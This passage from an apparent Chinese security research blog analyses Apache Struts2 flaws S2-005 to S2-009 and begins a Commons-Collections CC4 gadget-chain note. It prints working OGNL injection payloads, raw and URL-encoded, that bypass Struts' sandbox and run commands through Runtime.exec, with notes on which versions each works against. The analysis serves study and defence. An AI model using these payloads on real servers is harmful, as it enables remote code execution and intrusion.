方法中找到了对应的键 <code>_memberAccess</code> 会返回 memberAccess</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409122809009.png" alt="image-20250409122809009"></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>所以就构造出来可以绕过的 payload</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023lingx5\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)<br></code></pre></td></tr></table></figure><p>看到当我们用 Runtime 执行方法时，excludeProperties 为空，成功绕过</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409125047313.png" alt="image-20250409125047313"></p><p>执行成功</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409125127030.png" alt="image-20250409125127030"></p><p>当然为了 payload 的通用性，我们还可以一并把 acceptProperties 设为空集，allowStaticMethodAccess 设置为 true</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023_memberAccess.acceptProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023_memberAccess.allowStaticMethodAccess \u003dtrue&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023lingx5\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409125605744.png" alt="image-20250409125605744"></p><h2 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h2><p>影响版本：Struts 2.0.0 - Struts 2.2.3 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-007">https://cwiki.apache.org/confluence/display/WW/S2-007 </a> </p><p>在我们向表单中输入数据时，比如 <code>int age</code> 我们给它输入一个 <code>aaa</code> 的字符串。这时他转换不成 int 类型，struts2 就会调用 com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor 拦截器来处理这个错误，并且将用户输入取出插入到当前值栈中，二次解析我们的输入，从而造成了表达式注入</p><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们向 为 int 类型的 age 字段 输入 <code>aaaa</code></p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409150608407.png" alt="image-20250409150608407" style="zoom:50%;" /><p>在 ConversionErrorInterceptor#intercept() 下断点，跟一下看他如何处理的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409150743359.png" alt="image-20250409150743359"></p><p>执行 getOverrideExpr 生成一个表达式，用于覆盖默认的转换结果。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409151300703.png" alt="image-20250409151300703"></p><p>看到它给我们的值做了 字符串拼接，用 <code>‘ ’</code> 进行包裹</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409153345360.png" alt="image-20250409153345360"></p><p>然后保存到 context 中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409152415626.png" alt="image-20250409152415626"></p><p>最终在 doEndTag 进行解析的时候，执行 overrides.get(expr) 获取 <code>‘ ’</code> 包裹的错误值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409154859565.png" alt="image-20250409154859565"></p><p>看一下调用栈</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">findValue:</span><span class="hljs-number">258</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">149</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">100</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">73</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">findValue:</span><span class="hljs-number">313</span>, Component (org.apache.struts2.components)<br><span class="hljs-symbol">evaluateParams:</span><span class="hljs-number">723</span>, UIBean (org.apache.struts2.components)<br><span class="hljs-symbol">end:</span><span class="hljs-number">481</span>, UIBean (org.apache.struts2.components)<br><span class="hljs-symbol">doEndTag:</span><span class="hljs-number">43</span>, ComponentTagSupport (org.apache.struts2.views.jsp)<br></code></pre></td></tr></table></figure><p>getValue 后续的解析就和之前差不多了，注意 AST 表达式的生成和调用方法就可以</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>我们可以使用  <code>&#39;+ +&#39;</code> 去闭合 getOverrideExpr  添加的 <code>&#39;</code> </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;+ (@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)) +&#x27;<br></code></pre></td></tr></table></figure><p>成功执行</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409161935368.png" alt="image-20250409161935368" style="zoom:50%;" /><blockquote><p>可能有点疑惑的就是，我们在 S2-003 的时候 不是还要添加 #context [“xwork.MethodAccessor.denyMethodExecution”] &#x3D; false 吗？为什么这个不添加，也可以执行呢？</p><p>答案其实也很简单，因为 S2-003 是在参数拦截器造成的问题，而在拦截器的方法中(ParametersInterceptor#intercept) 显示的把 denyMethodExecution 设置为了 true，但是在执行完成之后的 finally 代码快中 又设置为了 false</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409165616851.png" alt="image-20250409165616851"></p><p>而我们的 S2-007 并不是在 <em>ParametersInterceptor</em> 这里 解析的，而是在 doEndTag 方法中 解析</p></blockquote><p>在 Struts 2.0.12 以后 添加了 allowStaticMethodAccess 这个属性，可以用以下 payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27; + (#_memberAccess[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span>().exec(&#x27;calc&#x27;))+ &#x27;<br></code></pre></td></tr></table></figure><p><span style="color:#FF0000;"> 亲测 在 2.0.12 中不存在此漏洞， struts2 会给强转类型一个默认值 不会给 overrides 填值 </span></p><img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-09_19-14-13.gif" alt="PixPin_2025-04-09_19-14-13" style="zoom:50%;" /><p>而在 后一个版本（2.0.14）中 又可以利用了</p><img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-09_19-12-51.gif" alt="PixPin_2025-04-09_19-12-51" style="zoom:50%;" /><p>调试了一下 发现，在 2.0.14 中 的 SecurityMemberAccess#isExcluded 当 paramName 为 null 时不在抛出异常，也就是第一个 payload 和 第二个 payload 都可以用 而且 不用像 S2-005 的绕过 一样，把 excludeProperties 设置为空</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409192428124.png" alt="image-20250409192428124"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409192509224.png" alt="image-20250409192509224"></p><p><strong>注意</strong></p><blockquote><p>如果在 2.0.12 之前版本 只能用 <code>&#39;+ (@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)) +&#39;</code></p><p>否则的话会报错</p><p>ognl.NoSuchPropertyException: ognl.DefaultMemberAccess.allowStaticMethodAccess</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409163039271.png" alt="image-20250409163039271"></p><p>在之后更推荐 <code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))+ &#39;</code></p><p>因为攻击目标可能手动把 allowStaticMethodAccess 设置为 false</p></blockquote><h2 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.17 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-008">https://cwiki.apache.org/confluence/display/WW/S2-008</a></p><blockquote><p>为防止攻击者在参数中调用任意方法，标志 xwork.MethodAccessor.denyMethodExecution 默认设置为 true，SecurityMemberAccess 字段 allowStaticMethodAccess 默认设置为 false。此外，自 Struts 2.2.1.1 起，为防止访问上下文变量，在 ParameterInterceptor 中应用了改进的参数名称字符白名单: </p><p><code>acceptedParamNames = &quot;[a-zA-Z0-9\.][()_&#39;]+&quot;;</code></p><ol><li><strong>Remote command execution in Struts &lt;&#x3D; 2.2.3 (<code>ExceptionDelegator</code>)</strong></li><li><strong>Remote command execution in Struts &lt;&#x3D; 2.3.1 (<code>CookieInterceptor</code>)</strong></li><li><strong>Arbitrary File Overwrite in Struts &lt;&#x3D; 2.3.1 (<code>ParameterInterceptor</code>)</strong></li><li><strong>Remote command execution in Struts &lt;&#x3D; 2.3.17 (<code>DebuggingInterceptor</code>)</strong></li></ol></blockquote><p>其中 第一条就是说的 S2-007 漏洞，利用错误的强转来实现 RCE</p><p>3、ParameterInterceptor 这个就是由于 acceptedParamNames 的正则过滤没有过滤掉 括号 符号，从而可以调用一些构造方法，比如 FileWriter  可以创建 文件或者 把已有的文件制空</p><p>4、DebuggingInterceptor 这其实可以看作 Struts 的一个特性，因为 debug 模式下，本身就赋予了命令执行的权力</p><p><code>&lt;constant name=&quot;struts.devMode&quot; value=&quot;true&quot; /&gt;</code></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">debug=command&amp;<span class="hljs-keyword">expression</span>=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%22calc%22%29)<br></code></pre></td></tr></table></figure><p>不过这种只能算是一种安全风险，感觉算不上是漏洞，而是 struts2 的 debug 特性</p><p>debug 有 三种模式 在 org.apache.struts2.interceptor.debugging.DebuggingInterceptor#intercept 中可以看到</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410134711475.png" alt="image-20250410134711475"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410134727023.png" alt="image-20250410134727023"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410134743944.png" alt="image-20250410134743944"></p><p>command 的主要逻辑 就是 获得了  expression 参数，并执行 stack.findValue(cmd) 从而解析了恶意的 ognl 表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;command&quot;</span>.equals(type)) &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * 从会话中获取之前保存的ValueStack对象。</span><br><span class="hljs-comment">                 * 如果会话中不存在，则从当前ActionContext中获取ValueStack对象，并将其保存到会话中。</span><br><span class="hljs-comment">                 */</span><br>    <span class="hljs-type">ValueStack</span> <span class="hljs-variable">stack</span> <span class="hljs-operator">=</span> (ValueStack)ctx.getSession().get(<span class="hljs-string">&quot;org.apache.struts2.interceptor.debugging.VALUE_STACK&quot;</span>);<br>    <span class="hljs-keyword">if</span> (stack == <span class="hljs-literal">null</span>) &#123;<br>        stack = (ValueStack)ctx.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;</span>);<br>        ctx.getSession().put(<span class="hljs-string">&quot;org.apache.struts2.interceptor.debugging.VALUE_STACK&quot;</span>, stack);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * 从请求参数中获取要执行的表达式。</span><br><span class="hljs-comment">                 * 设置请求属性，禁用装饰器。</span><br><span class="hljs-comment">                 * 设置响应的内容类型为纯文本。</span><br><span class="hljs-comment">                 */</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getParameter(<span class="hljs-string">&quot;expression&quot;</span>);<br>    ServletActionContext.getRequest().setAttribute(<span class="hljs-string">&quot;decorator&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>);<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> ServletActionContext.getResponse();<br>    res.setContentType(<span class="hljs-string">&quot;text/plain&quot;</span>);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> ServletActionContext.getResponse().getWriter();<br>        <span class="hljs-comment">// 调用 findValue 执行 ognl 表达式</span><br>        writer.print(stack.findValue(cmd));<br>        writer.close();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>        ex.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h2><p>影响版本：Struts 2.0.0-Struts 2.3.1.1 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-009">https://cwiki.apache.org/confluence/display/WW/S2-009</a></p><p>S2-009 是利用参数值进行绕过，因为  acceptedParamNames  只对参数名称加强了正则表达式，而未对值进行严格的过滤，在 ParametersInterceptor 中 会将其添加到 stack 中，我们利用表达式取出值，进行二次解析，就可以实现命令执行</p><p>其实本质还是对 S2-003 的绕过，使用了如下正则</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> acceptedParamNames <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[a-zA-Z0-9<span class="hljs-subst">\\</span>.<span class="hljs-subst">\\</span>]<span class="hljs-subst">\\</span>[<span class="hljs-subst">\\</span>(<span class="hljs-subst">\\</span>)_&#x27;<span class="hljs-subst">\\</span>s]+&quot;</span>;<br></code></pre></td></tr></table></figure><p>我们可以使用 <code>top[&#39;foo&#39;](0)</code> 来访问 action 中的参数，并解析执行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">foo=(<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]</span>=new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Boolean</span>(false), #_memberAccess<span class="hljs-selector-attr">[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]</span>=true,@java<span class="hljs-selector-class">.lang</span>.Runtime@<span class="hljs-built_in">getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;calc&quot;</span>))(lingx5)&amp;<span class="hljs-attribute">top</span>[<span class="hljs-string">&#x27;foo&#x27;</span>](<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>url 编码后</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">foo<span class="hljs-operator">=</span>(<span class="hljs-variable">%23</span>context<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span>new java.lang.Boolean(<span class="hljs-keyword">false</span>)<span class="hljs-punctuation">,</span> <span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>allowStaticMethodAccess<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span>().exec(<span class="hljs-variable">%22</span>calc<span class="hljs-variable">%22</span>))(lingx<span class="hljs-number">5</span>)&amp;top<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>foo<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意</strong> </p><p>url 编码不要 把 &#x3D; 号 和 &amp; 符号 进行编码，不然 ParametersInterceptor 无法识别，分割参数，会导致无法执行</p></blockquote><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>其实就是 action 里有一个名为 foo 的变量，我们把 ognl 表达式 赋值给它，在通过 struts2 取出，做二次解析</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150233996.png" alt="image-20250410150233996"></p><p>这里就是 foo 和 <code>top[&#39;foo&#39;](0)</code> 因为正则表达式 运行 <code>[]() &#39;&#39;</code> 这些字符 所以 这个式子可以正常添加进 acceptableParameters 这个 map 中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150429721.png" alt="image-20250410150429721"></p><p>之后是遍历 acceptableParameters 调用 newStack.setValue(name, value);</p><p>先给 action 的 foo 属性赋值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150549762.png" alt="image-20250410150549762"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150633810.png" alt="image-20250410150633810"></p><p>开始执行 <code>top[&#39;foo&#39;](0)</code> 了，看到解析为了 ASTEval 表达式，其实和之前就很相似了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150809295.png" alt="image-20250410150809295"></p><p>还是熟悉的 this._children[0].getValue  把 top 解析为了 ASTProperty 获取了 TestAction 这个类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410151155646.png" alt="image-20250410151155646"></p><p>同样的 foo 获取了 ognl表达式</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410151434242.png" alt="image-20250410151434242"></p><p>后续就会来到 ASTEval 的 setValue 方法，之后再把 children[0] 解析成 ASTEval 节点，后续就和 S2-003 一样了</p><p><span style="color:#FF0000;">其实主要还是对 acceptedParamNames 这个正则的绕过</span></p><p>还有种 POC 是这样的</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">foo=(<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]</span>= new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Boolean</span>(false), #_memberAccess<span class="hljs-selector-attr">[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]</span>= new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Boolean</span>(true), @java<span class="hljs-selector-class">.lang</span>.Runtime@<span class="hljs-built_in">getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>))(meh)&amp;z<span class="hljs-selector-attr">[(foo)(<span class="hljs-string">&#x27;meh&#x27;</span>)]</span>=true<br></code></pre></td></tr></table></figure><p>url 编码后</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">foo<span class="hljs-operator">=</span><span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>context<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>D+new+java.lang.Boolean<span class="hljs-variable">%28</span><span class="hljs-keyword">false</span><span class="hljs-variable">%29</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span><span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>allowStaticMethodAccess<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>d+new+java.lang.Boolean<span class="hljs-variable">%28</span><span class="hljs-keyword">true</span><span class="hljs-variable">%29</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span><span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.exec<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%28</span>meh<span class="hljs-variable">%29</span>&amp;z<span class="hljs-variable">%5</span>B<span class="hljs-variable">%28</span>foo<span class="hljs-variable">%29</span><span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>meh<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><p>也是可以完成利用的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410164211892.png" alt="image-20250410164211892"></p><blockquote><p>值得注意的是，两个表达式在 TreeMap中的存放顺序，要让 ParametersInterceptor 在setValue时，先去进行 foo 的赋值，在进行后续foo 的读取和执行</p></blockquote><p>就比如我把最后的 <code>z[(foo)(&#39;meh&#39;)]</code> 改为 <code>a[(foo)(&#39;meh&#39;)]</code> 就无法执行成功</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">foo<span class="hljs-operator">=</span><span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>context<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>D+new+java.lang.Boolean<span class="hljs-variable">%28</span><span class="hljs-keyword">false</span><span class="hljs-variable">%29</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span><span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>allowStaticMethodAccess<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>d+new+java.lang.Boolean<span class="hljs-variable">%28</span><span class="hljs-keyword">true</span><span class="hljs-variable">%29</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span><span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.exec<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%28</span>meh<span class="hljs-variable">%29</span>&amp;a<span class="hljs-variable">%5</span>B<span class="hljs-variable">%28</span>foo<span class="hljs-variable">%29</span><span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>meh<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410164845528.png" alt="image-20250410164845528" style="zoom: 50%;" /><p>参考文章</p><p><a href="https://zhuanlan.zhihu.com/p/624053727">Struts2-001 漏洞分析（CVE-2007-4556） - 知乎</a></p><p><a href="https://www.javasec.org/java-vuls/Struts/Struts2-1.html">https://www.javasec.org/java-vuls/Struts/Struts2-1.html</a></p><p><a href="https://github.com/xhycccc/Struts2-Vuln-Demo">https://github.com/xhycccc/Struts2-Vuln-Demo</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Struts2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Struts2</tag>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-CC4 链审计笔记</title>
    <link href="/2025/04/06/java-CC4-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/06/java-CC4-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="java-CC4-链审计笔记"><a href="#java-CC4-链审计笔记" class="headerlink" title="java-CC4 链审计笔记"></a>java-CC4 链审计笔记</h1><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>来自ysoserial</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/*<br> * Variation <span class="hljs-keyword">on</span> CommonsCollections2 <span class="hljs-keyword">that</span> uses InstantiateTransformer <span class="hljs-keyword">instead of</span><br> * InvokerTransformer.<br> */<br></code></pre></td></tr></table></figure><p>是CC2的变种 ，其实就和我们的CC1&#x3D;&gt;CC3 是一样的，就不在赘述了</p><p>InstantiateTransformer.transform 具有类实例化的能力，也是利用 TrAXFilter 类和 TemplatesImpl 类做的恶意类加载</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Gadget chain:<br>ObjectInputStream<span class="hljs-selector-class">.readObject</span>()<br>PriorityQueue<span class="hljs-selector-class">.readObject</span>()<br>...<br>TransformingComparator<span class="hljs-selector-class">.compare</span>()<br>ChainedTransformer<span class="hljs-selector-class">.transform</span>()<br>InstantiateTransformer<span class="hljs-selector-class">.transform</span>()<br>TrAXFilter<span class="hljs-selector-id">#TrAXFilter</span><br>TemplatesImpl<span class="hljs-selector-class">.newTransformer</span>()<br>Runtime<span class="hljs-selector-class">.exec</span>()<br></code></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 